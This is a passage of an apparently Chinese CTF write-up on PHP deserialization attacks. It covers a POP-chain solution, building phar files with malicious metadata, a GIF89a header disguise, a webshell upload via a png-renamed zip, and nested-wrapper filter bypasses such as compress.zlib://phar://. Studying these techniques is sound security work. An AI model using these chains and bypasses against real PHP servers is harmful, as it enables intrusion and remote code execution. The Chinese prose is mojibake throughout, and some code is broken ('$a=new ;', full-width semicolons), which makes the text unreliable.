$_GET[&#x27;w00m&#x27;];</span><br><span class="line">Â unserialize($w00m);</span><br></pre></td></tr></table></figure><h6 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h6><p>1.é¦–å…ˆçœ‹åˆ°w44mè¿™ä¸ªclassï¼Œè‡ªç„¶å†™å‡ºè„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Â class w44m</span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â private $admin = &#x27;w44m&#x27;;</span><br><span class="line">Â  Â  Â protected $passwd = &#x27;08067&#x27;;</span><br><span class="line">Â &#125;</span><br><span class="line">Â $a=new ;</span><br><span class="line">Â â€‹</span><br><span class="line">Â echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>2.ç°åœ¨ç›®çš„æ˜¯è°ƒç”¨ function Getflag()ï¼Œè¿™ä¸ªå‡½æ•°ã€‚ç„¶åpayloadåº”è¯¥æ˜¯ &#x2F;?w00m&#x3D;(æœ€åä¸¤æ’)</p><p>3.æœ€åä¸€æ­¥æ˜¯ååºåˆ—åŒ–ä¸€ä¸ªw00mï¼Œé‚£ä¹ˆè€ƒè™‘ä»destructå…¥æ‰‹ï¼ˆé”€æ¯æ—¶è°ƒç”¨ï¼‰ã€‚</p><p>4.è°ƒç”¨distructï¼Œå°±æ˜¯ä¸€ä¸ªechoï¼Œè¿™ä¸ªæ—¶å€™æƒ³åˆ°å¦ä¸€ä¸ªé­”æœ¯æ–¹æ³•__toStringï¼ˆå°†å¯¹è±¡ä½œä¸ºå­—ç¬¦ä¸²æ“ä½œæ—¶è°ƒç”¨ï¼‰ï¼Œæ‰€ä»¥è¦è®©$this-&gt;w00må­˜çš„æ˜¯å­—ç¬¦ä¸²ã€‚</p><p>5.è°ƒç”¨åï¼Œæ­¤æ—¶ $this-&gt;w00m-&gt;{$this-&gt;w22m}(); æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ªï¼ˆï¼‰ï¼Œåƒæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœw22m&#x3D;Getflagé‚£ä¹ˆå°±å˜æˆ $this-&gt;w00m-&gt;Getflagï¼ˆï¼‰ã€‚ã€‚ã€‚ä¹Ÿå°±æ˜¯è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œè¾¾åˆ°ç›®çš„ã€‚æ‰€ä»¥è®©w00mè¡¨ç¤ºclass w44mè¿™ä¸ªç±»</p><p>6.å…ˆå†™å‡ºè¿™å‡ ä¸ªå¯¹è±¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Â class w44m</span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â private $admin = &#x27;w44m&#x27;;</span><br><span class="line">Â  Â  Â protected $passwd = &#x27;08067&#x27;;</span><br><span class="line">Â &#125;</span><br><span class="line">Â class w22m</span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â public $w00m;</span><br><span class="line">Â &#125;</span><br><span class="line">Â class w33m</span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â public $w00m;</span><br><span class="line">Â  Â  Â public $w22m;</span><br><span class="line">Â &#125;</span><br><span class="line">Â     $a = new w22mï¼›</span><br><span class="line">Â  Â  Â $b= new w33mï¼›</span><br><span class="line">Â  Â  Â $c = new w44mï¼›</span><br><span class="line">Â  Â  Â </span><br></pre></td></tr></table></figure><h6 id="æ€»ä½“æ€è·¯ï¼š"><a href="#æ€»ä½“æ€è·¯ï¼š" class="headerlink" title="æ€»ä½“æ€è·¯ï¼š"></a>æ€»ä½“æ€è·¯ï¼š</h6><blockquote><p>#å…·ä½“é“¾å­æ˜¯ï¼š w22m-&gt;w00m&#x3D;new w33m â€”â€”â€“ã€‹ tostring â€”â€”â€“ã€‹ w33m-&gt;woom&#x3D;w44m + w33m-&gt;w22m&#x3D;Getflag â€”â€”â€“ã€‹ Getflag()</p></blockquote><p>1.$a-&gt;w00m&#x3D;$b;</p><p>è§¦å‘destructåè°ƒç”¨w33m.__toString();</p><p>2.$b-&gt;w22m&#x3D;â€™Getflagâ€™;</p><p>$b-&gt;w00m&#x3D;$c;</p><p>è®©$this-&gt;w00m-&gt;{$this-&gt;w22m}(); å˜æˆæ‰§è¡Œ$cä¸­Getflag()å‡½æ•°</p><h6 id="ç­”æ¡ˆï¼ˆæŠ„ï¼‰"><a href="#ç­”æ¡ˆï¼ˆæŠ„ï¼‰" class="headerlink" title="ç­”æ¡ˆï¼ˆæŠ„ï¼‰"></a>ç­”æ¡ˆï¼ˆæŠ„ï¼‰</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php class w44m&#123; private $admin = &#x27;w44m&#x27;; protected $passwd = &#x27;08067&#x27;; &#125;</span><br><span class="line">Â class w22m&#123; public $w00m; &#125;</span><br><span class="line">Â class w33m&#123; public $w00m; public $w22m; &#125;</span><br><span class="line">Â # w22m.__destruct().w00m-&gt;w33m.__toString().w00m-&gt;w44m.Getflag()</span><br><span class="line">Â $a = new w22m();</span><br><span class="line">Â $b = new w33m();</span><br><span class="line">Â $c = new w44m(); # å…¥å£</span><br><span class="line">Â $a-&gt;w00m=$b; # é“¾å­</span><br><span class="line">Â $b-&gt;w00m=$c;</span><br><span class="line">Â $b-&gt;w22m=&#x27;Getflag&#x27;; </span><br><span class="line">Â echo urlencode(serialize($a)); ?&gt; </span><br></pre></td></tr></table></figure><hr><h4 id="pharååºåˆ—åŒ–"><a href="#pharååºåˆ—åŒ–" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h4><h5 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h5><p>Pharå…¨ç§° PHP Archive</p><p>Pharå¯ä»¥è®¤ä¸ºæ˜¯PHPçš„å‹ç¼©æ–‡æ¡£ï¼Œæ˜¯PHPä¸­ç±»ä¼¼äºJARçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ã€‚ä»–å¯ä»¥æŠŠå¤šä¸ªæ–‡ä»¶å­˜æ”¾è‡³åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œæ— éœ€è§£å‹ï¼ŒPHPå°±å¯ä»¥è¿›è¡Œè®¿é—®å¹¶æ‰§è¡Œå…¶å†…éƒ¨è¯­å¥ã€‚.pharæ–‡ä»¶æä¾›äº†ä¸€ç§å°†å®Œæ•´çš„PHPç¨‹åºåˆ†å¸ƒåœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å¹¶ä»è¯¥æ–‡ä»¶ä¸­è¿è¡Œçš„æ–¹æ³•ã€‚</p><p>ä¸€äº›é…ç½®ï¼š</p><blockquote><p>é»˜è®¤pharæ‰©å±•æ˜¯åªè¯»æ¨¡å¼ï¼Œéœ€è¦æ‰‹åŠ¨é…ç½®php.iniä¸­<code>phar.readonly= Off</code></p><p>é»˜è®¤å¼€å¯ç‰ˆæœ¬ PHP version &gt;&#x3D; 5.3</p></blockquote><p><strong>demo</strong>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php</span><br><span class="line">Â  Â  Â $phar = new Phar(&#x27;demo.phar&#x27;);</span><br><span class="line">Â  Â  Â $phar[&#x27;demo.php&#x27;] = &#x27;&lt;?php echo 1;?&gt;&#x27;;</span><br><span class="line">Â  Â  Â include(&#x27;phar://./demo.phar/demo.php&#x27;); //1</span><br><span class="line">Â ?&gt;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨phar:&#x2F;&#x2F;ä¼ªåè®®è¯»å–pharæ–‡ä»¶ã€‚</p><h6 id="Pharæ–‡ä»¶æ ¼å¼"><a href="#Pharæ–‡ä»¶æ ¼å¼" class="headerlink" title="Pharæ–‡ä»¶æ ¼å¼"></a>Pharæ–‡ä»¶æ ¼å¼</h6><ul><li>a stub</li><li>a manifest describing the contents</li><li>the file contents</li><li>[optional] a signature for verify Phar integrity(phar file format only)</li></ul><p><strong>stub</strong>ï¼šstubæ˜¯pharæ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼Œæ ¼å¼ä¸ºï¼š<code>...&lt;?php... __HALT_COMPILER();?&gt;</code>å…¶ä¸­<code>...</code>å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ï¼Œä¹Ÿå¯ä»¥ç•™ç©ºï¼Œç•™ç©ºçš„è¯å°±æ˜¯ï¼š<code>&lt;?php __HALT_COMPILER();?&gt;</code>ã€‚æ³¨æ„phpé—­åˆå·ä¸æœ€åä¸€ä¸ªåˆ†å·ä¹‹é—´ä¸èƒ½æœ‰å¤šäºä¸€ä¸ªçš„ç©ºæ ¼ç¬¦ã€‚å¦å¤–PHPé—­åˆç¬¦ä¹Ÿæ˜¯å¯ä»¥çœç•¥çš„ã€‚</p><p>æœ€çŸ­çœç•¥é—­åˆç¬¦çš„stubæ˜¯<code>__HALT_COMPILER();?&gt;</code></p><p><strong>manifest describing the contents</strong>ï¼šè¯¥åŒºåŸŸå­˜æ”¾pharåŒ…çš„å±æ€§ä¿¡æ¯ï¼Œå…è®¸æ¯ä¸ªæ–‡ä»¶æŒ‡å®šæ–‡ä»¶å‹ç¼©ã€æ–‡ä»¶æƒé™ï¼Œç”šè‡³æ˜¯ç”¨æˆ·å®šä¹‰çš„å…ƒæ•°æ®ï¼Œå¦‚æ–‡ä»¶ç”¨æˆ·æˆ–ç»„ã€‚</p><p><strong>file contents</strong> ï¼šè¢«å‹ç¼©çš„ç”¨æˆ·æ·»åŠ çš„æ–‡ä»¶å†…å®¹</p><p><strong>[å¯é€‰]signature</strong>ï¼šå¯é€‰ï¼Œpharæ–‡ä»¶çš„ç­¾åï¼Œå…è®¸çš„æœ‰MD5, SHA1, SHA256, SHA512å’ŒOPENSSL</p><h6 id="ç”ŸæˆPharæ–‡ä»¶"><a href="#ç”ŸæˆPharæ–‡ä»¶" class="headerlink" title="ç”ŸæˆPharæ–‡ä»¶"></a>ç”ŸæˆPharæ–‡ä»¶</h6><ul><li><p>å®ä¾‹åŒ–Pharç±»ï¼šé€šå¸¸åªéœ€è¦ä¼ å…¥æ–‡ä»¶åÂ <?php  Â  $phar = new Phar('demo.phar');  Â ?>å…·ä½“å‚æ•°è§£è¯»ï¼š<code>new Phar($buildRoot . &quot;/myphar.phar&quot;, FilesystemIterator::CURRENT_AS_FILEINFO FilesystemIterator::KEY_AS_FILENAME, &quot;myphar.phar&quot;);ã€‚</code>ä¸€ä¸ªæ–°çš„Pharå¯¹è±¡çš„åˆ›å»ºé€šå¸¸éœ€è¦ä¸‰ä¸ªå‚æ•°ã€‚</p><ul><li>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯Pharæ–‡ä»¶è·¯å¾„[ä¸ä»…å¯ä»¥é€šè¿‡å®ƒåˆ›å»ºPharæ–‡ä»¶è¿˜å¯ä»¥å¯¹ç°å­˜çš„Pharæ–‡ä»¶è¿›è¡Œæ“ä½œ]</li><li>ç¬¬äºŒä¸ªå‚æ•°æ˜¯è®¾å®šPharæ–‡ä»¶å¯¹è±¡å¦‚ä½•å¤„ç†æ–‡ä»¶ã€‚å¯ä»¥ä¸å¡«å†™æ­¤æ—¶æä¾›çš„å€¼æ˜¯<code>RecursiveDirectoryIterator</code> çš„ç¼ºçœå€¼ã€‚</li><li>ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯Pharæ–‡ä»¶çš„åˆ«åï¼Œåœ¨å†…éƒ¨å¼•ç”¨è¿™ä¸ªPharæ–‡ä»¶æ—¶éƒ½éœ€è¦ä½¿ç”¨è¿™ä¸ªåˆ«å</li></ul><p><strong>é€šå¸¸æˆ‘ä»¬åªéœ€è¦ä¼ å…¥ç¬¬ä¸‰ä¸ªå‚æ•°ã€‚</strong></p></li><li><p>åˆ›å»ºstubæœ‰ä¸¤ç§æ–¹æ³•åˆ›å»ºstubï¼šè‡ªå®šä¹‰åˆ›å»ºå’Œä½¿ç”¨é»˜è®¤stubã€‚</p><ul><li>è‡ªå®šä¹‰åˆ›å»ºï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨ç±»æ–¹æ³•<code>Phar::setStub($string)</code>ä¸ºå®ä¾‹åˆ›å»ºè‡ªå®šä¹‰stubÂ <?php  Â  $phar = new Phar('demo.phar');  Â  $phar->setStub('<?php echo \\'in stub!\\';\_\_HALT\_COMPILER();?>â€˜);<br>Â  include(â€˜phar:&#x2F;&#x2F;demo.pharâ€™); &#x2F;&#x2F; in stub!<br>Â ?&gt;</li><li>ä½¿ç”¨é»˜è®¤stubï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨ç±»æ–¹æ³•<code>Phar::setDefaultStub()</code>ä¸ºå®ä¾‹è®¾ç½®é»˜è®¤stubï¼Œä½¿ç”¨æ–¹æ³•<code>Phar::getStub()</code>è·å–å®ä¾‹çš„stubÂ <?php  Â  Â  Â $phar = new Phar('demo.phar');  Â  Â  Â $phar->setDefaultStub();  Â  Â  Â print\_r($phar->getStub()); // 2, 'c' => 'text/plain', 'cc' => 'text/plain', ...  Â ?></li></ul></li><li><p>ã€å¯é€‰ã€‘æ·»åŠ è‡ªå®šä¹‰å…ƒæ•°æ®è°ƒç”¨ç±»æ–¹æ³•<code>Phar::setMetadata()</code>ä¸ºå®ä¾‹è®¾ç½®é»˜è®¤stubï¼Œä½¿ç”¨æ–¹æ³•Phar::getMetadata()è·å–å®ä¾‹çš„stubÂ <?php  Â  Â  Â $phar = new Phar('demo.phar');  Â  Â  Â $metadata = array('demo'=>1);  Â  Â  Â $phar->setMetadata($metadata);  Â  Â  Â print\_r($phar->getMetadata()); // Array ( \[demo\] => 1 )  Â ?></p></li><li><p>ã€å¯é€‰ã€‘æ·»åŠ æ–‡ä»¶æ·»åŠ æ–‡ä»¶æœ‰å‡ ç§æ–¹æ³•ï¼šæ‰‹åŠ¨æ·»åŠ å·²æœ‰æ–‡ä»¶ï¼Œä»¥å­—ç¬¦ä¸²æ·»åŠ æ–‡ä»¶å†…å®¹ï¼Œæ·»åŠ ç©ºç›®å½•ï¼Œæ‰‹åŠ¨é€‰æ‹©æ·»åŠ å·²æœ‰ç›®å½•ï¼Œä»è¿­ä»£å™¨æ·»åŠ ã€‚é‡ç‚¹çœ‹å‰ä¸¤ä¸ª</p><ul><li>æ‰‹åŠ¨æ·»åŠ å·²æœ‰æ–‡ä»¶Â <?php  Â  $phar = new Phar('demo.phar');  Â  $phar->addFile('test.php');  Â  include('phar://demo.phar/test.php') // in test.php  Â ?></li><li>ä»¥å­—ç¬¦ä¸²å½¢å¼æ·»åŠ æ–‡ä»¶å†…å®¹Â <?php  Â  $phar = new Phar('demo.phar');  Â  $phar->addFromString('test.php','<?php echo \\'in test.php\\'?>â€˜);<br>Â  include(â€˜phar:&#x2F;&#x2F;demo.phar&#x2F;test.phpâ€™); &#x2F;&#x2F; in test.php<br>Â ?&gt;</li></ul></li><li><p>ã€å¯é€‰ã€‘æ‰‹åŠ¨æ·»åŠ æ”¯æŒçš„ç­¾åç¼ºçœä¼šè‡ªåŠ¨ç­¾åï¼ŒåŸºäºSHA-1ç®—æ³•Â <?php  Â  $phar = new Phar('demo.phar');  Â  $phar->addFromString('test.php',1);  Â print\_r($phar->getSignature()); // Array ( \[hash\] => F... \[hash\_type\] => SHA-1 )  Â ?></p></li><li><p>ã€å¯é€‰ã€‘æé«˜æ€§èƒ½åœ¨å®ä¾‹åŒ–pharç±»åï¼Œè°ƒç”¨æ–¹æ³•<code>Phar::startBuffering()</code>å’Œ<code>Phar::stopBuffering</code>åˆ›å»ºç¼“å†²åŒºï¼Œå¹¶åœ¨ç¼“å†²åŒºè¿›è¡Œåˆ›å»ºã€æ·»åŠ ç­‰æ“ä½œÂ <?php  Â  $phar = new Phar('phar.phar');  Â  $phar->startBuffering();  Â  $phar->setStub('<? \_\_HALT\_\_COMPILER();?>â€˜);<br>Â  $phar-&gt;addFromString(â€˜test.phpâ€™,â€™<?php echo \\'in test.php\\'?>â€˜);<br>Â  $phar-&gt;stopBuffering();<br>Â ?&gt;ä¸Šé¢è¿™ä¸ªdemoå°±æ˜¯åˆ›å»ºä¸€ä¸ªPharæ–‡ä»¶çš„åŸºæœ¬æ­¥éª¤ã€‚</p></li></ul><h6 id="phpæ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶åŒ…å«-pharä¼ªåè®®"><a href="#phpæ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶åŒ…å«-pharä¼ªåè®®" class="headerlink" title="phpæ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶åŒ…å«(pharä¼ªåè®®)"></a>phpæ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶åŒ…å«(pharä¼ªåè®®)</h6><p>åŸç†ï¼šé€šè¿‡ä¼ªåè®®ä¸Šä¼ é©¬ï¼Œç„¶åè¿æ¥webshell</p><p>pharä¼ªåè®®ç‰¹æ€§ï¼š<code>ä¸ç®¡åç¼€æ˜¯ä»€ä¹ˆï¼Œéƒ½å½“ä½œå‹ç¼©åŒ…æ¥è§£</code></p><p>pharåè®®å’Œzipåè®®å·®ä¸è¿‡ï¼Œéƒ½æ˜¯å¯ä»¥è®¿é—®zipæ ¼å¼çš„å‹ç¼©åŒ…çš„å†…å®¹</p><p>æ‰€ä»¥æˆ‘ä»¬å†™ä¸€ä¸ªPHPä¸€å¥è¯é©¬ï¼Œå‹ç¼©æˆzipï¼Œæ¥ç€æ‰‹åŠ¨æ”¹åç¼€ä¸ºpngï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸­ã€‚æœ€åç”¨pharä¼ªåè®®æ–‡ä»¶åŒ…å«ï¼Œå‘ç°è¢«æˆåŠŸè§£æã€‚</p><hr><h5 id="åœ¨ååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨"><a href="#åœ¨ååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨" class="headerlink" title="åœ¨ååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨"></a>åœ¨ååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨</h5><p><code>æˆ‘ä»¬ä¸€èˆ¬åˆ©ç”¨ååºåˆ—æ¼æ´ï¼Œä¸€èˆ¬éƒ½æ˜¯å€ŸåŠ©unserialize()å‡½æ•°ï¼Œä¸è¿‡éšç€äººä»¬å®‰å…¨çš„æ„è¯†çš„æé«˜è¿™ç§æ¼æ´åˆ©ç”¨è¶Šæ¥è¶Šæ¥éš¾äº†ï¼Œä½†æ˜¯åœ¨ä»Šå¹´8æœˆä»½çš„Blackhat2018å¤§ä¼šä¸Šï¼Œæ¥è‡ªSecarmaçš„å®‰å…¨ç ”ç©¶å‘˜Sam Thomasè®²è¿°äº†ä¸€ç§æ”»å‡»PHPåº”ç”¨çš„æ–°æ–¹å¼ï¼Œåˆ©ç”¨è¿™ç§æ–¹æ³•å¯ä»¥åœ¨ä¸ä½¿ç”¨unserialize()å‡½æ•°çš„æƒ…å†µä¸‹è§¦å‘PHPååºåˆ—åŒ–æ¼æ´ã€‚æ¼æ´è§¦å‘æ˜¯åˆ©ç”¨Phar:// ä¼ªåè®®è¯»å–pharæ–‡ä»¶æ—¶ï¼Œä¼šååºåˆ—åŒ–meta-dataå‚¨å­˜çš„ä¿¡æ¯ã€‚</code></p><p>å³ï¼Œåœ¨é¢˜ç›®èƒŒæ™¯ä¸­æ²¡æœ‰ååºåˆ—åŒ–å‡½æ•°è€Œæœ‰æ–‡ä»¶ä¸Šä¼ çš„å…¥å£æ—¶ï¼Œå¯ä»¥è€ƒè™‘é€šè¿‡Pharä¼ªåè®®æ¥è¿›è¡Œè‡ªè‡ªåŠ¨çš„ååºåˆ—åŒ–ã€‚</p><h6 id="å‰æå‡½æ•°"><a href="#å‰æå‡½æ•°" class="headerlink" title="å‰æå‡½æ•°"></a>å‰æå‡½æ•°</h6><p><code>phpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡</code>phar:&#x2F;&#x2F;<code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œæµ‹è¯•åå—å½±å“çš„å‡½æ•°å¦‚ä¸‹</code></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/ad500678d3ce94923a94ed61e1ef9154-1024x322.png"></p><h6 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h6><p>demoï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php</span><br><span class="line">Â  Â  Â class TestObject &#123;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â  Â  Â $phar = new Phar(&quot;phar.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar</span><br><span class="line">Â  Â  Â $phar-&gt;startBuffering();</span><br><span class="line">Â  Â  Â $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub</span><br><span class="line">Â  Â  Â $o = new TestObject();</span><br><span class="line">Â  Â  Â $o -&gt; data=&#x27;hu3sky&#x27;;</span><br><span class="line">Â  Â  Â $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><br><span class="line">Â  Â  Â $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br><span class="line">Â  Â  Â //ç­¾åè‡ªåŠ¨è®¡ç®—</span><br><span class="line">Â  Â  Â $phar-&gt;stopBuffering();</span><br><span class="line">Â ?&gt;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li>pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯</li></ul><hr><h5 id="ä¸€äº›ç»•è¿‡"><a href="#ä¸€äº›ç»•è¿‡" class="headerlink" title="ä¸€äº›ç»•è¿‡"></a>ä¸€äº›ç»•è¿‡</h5><h6 id="æ–‡ä»¶å¤´æ£€æµ‹"><a href="#æ–‡ä»¶å¤´æ£€æµ‹" class="headerlink" title="æ–‡ä»¶å¤´æ£€æµ‹"></a>æ–‡ä»¶å¤´æ£€æµ‹</h6><p>å½“ç„¶å¦‚æœé¢˜ç›®è¿˜ä¼šåœ¨åç«¯æ£€æŸ¥æ–‡ä»¶ç±»å‹çš„è¯ï¼Œå°±éœ€è¦å°†pharæ–‡ä»¶åç¼€æ”¹æˆå›¾ç‰‡æˆ–è€…å…¶ä»–æ ¼å¼ã€‚</p><p>å†çœŸå®ä¸€ç‚¹ï¼Œå¯ä»¥åŠ ä¸€ä¸ªæ–‡ä»¶å¤´:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php</span><br><span class="line">Â  Â  Â class TestObject &#123;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â  Â  Â @unlink(&quot;phar.phar&quot;);</span><br><span class="line">Â  Â  Â $phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">Â  Â  Â $phar-&gt;startBuffering();</span><br><span class="line">Â  Â  Â $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´</span><br><span class="line">Â  Â  Â $o = new TestObject();</span><br><span class="line">Â  Â  Â $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span><br><span class="line">Â  Â  Â $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br><span class="line">Â  Â  Â //ç­¾åè‡ªåŠ¨è®¡ç®—</span><br><span class="line">Â  Â  Â $phar-&gt;stopBuffering();</span><br><span class="line">Â ?&gt;</span><br></pre></td></tr></table></figure><h6 id="pharæ–‡ä»¶å¼€å¤´"><a href="#pharæ–‡ä»¶å¼€å¤´" class="headerlink" title="pharæ–‡ä»¶å¼€å¤´"></a>pharæ–‡ä»¶å¼€å¤´</h6><p>å¦‚æœåç«¯è¿˜ä¸èƒ½è®©pharä½œä¸ºå¼€å¤´çš„è¯ï¼Œè¿˜èƒ½å¤Ÿä¸¤ä¸ªä¼ªåè®®åµŒå¥—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Â if (preg_match(&quot;/^php^file^gopher^http^https^ftp^data^phar^smtp^dict^zip/i&quot;,$filename)&#123;</span><br><span class="line">Â  Â  Â die();</span><br><span class="line">Â &#125;</span><br></pre></td></tr></table></figure><p>ç»•è¿‡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Â // Bzip / Gzip å½“ç¯å¢ƒé™åˆ¶äº†pharä¸èƒ½å‡ºç°åœ¨å‰é¢çš„å­—ç¬¦é‡Œã€‚å¯ä»¥ä½¿ç”¨compress.bzip2://å’Œcompress.zlib://ç»•è¿‡</span><br><span class="line">Â â€‹</span><br><span class="line">Â compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">Â compress.bzip2://phar:///home/sx/test.phar/test.txt</span><br><span class="line">Â compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line">Â php://filter/resource=phar:///test.phar/test.txt</span><br><span class="line">Â // è¿˜å¯ä»¥ä½¿ç”¨ä¼ªåè®®çš„æ–¹æ³•ç»•è¿‡</span><br><span class="line">Â php://filter/read=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure><p>ç»•è¿‡<code>__HALT_COMOILER</code>çš„æ£€æµ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Â if (preg_match(&quot;/&lt;/?phpHALT_COMPILER/i&quot;,$filename)&#123;</span><br><span class="line">Â  Â  Â die();</span><br><span class="line">Â &#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºpharæ–‡ä»¶è¦æ±‚å¿…é¡»æ˜¯ä»¥è¿™ä¸ªç»“å°¾ï¼Œä¸èƒ½ç»•è¿‡ï¼Œåªèƒ½æƒ³å…¶ä»–æ–¹æ³•</p><p>æ–¹æ³•ä¸€ï¼šå°†pharæ–‡ä»¶ä½¿ç”¨gzipå‘½ä»¤å‹ç¼©å‹ç¼©æ–‡ä»¶é‡Œé¢å°±æ²¡æœ‰<code>__HALT_COMOILER</code>äº†ï¼Œå˜æˆ<code>phar.phar.gz</code>ï¼Œä¸Šä¼ æˆåŠŸä¹‹ååˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è§£æè¯¥å‹ç¼©åŒ…ã€‚</p><p>æ–¹æ³•äºŒï¼šå°†pharçš„å†…å®¹å†™è¿›å‹ç¼©åŒ…æ³¨é‡Šä¸­ï¼Œä¹ŸåŒæ ·èƒ½å¤Ÿååºåˆ—åŒ–æˆåŠŸï¼Œå‹ç¼©ä¸ºzipä¹Ÿä¼šç»•è¿‡è¯¥æ­£åˆ™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Â $phar_file = serialize($exp);</span><br><span class="line">Â  Â  Â echo $phar_file;</span><br><span class="line">Â  Â  Â $zip = new ZipArchive();</span><br><span class="line">Â  Â  Â $res = 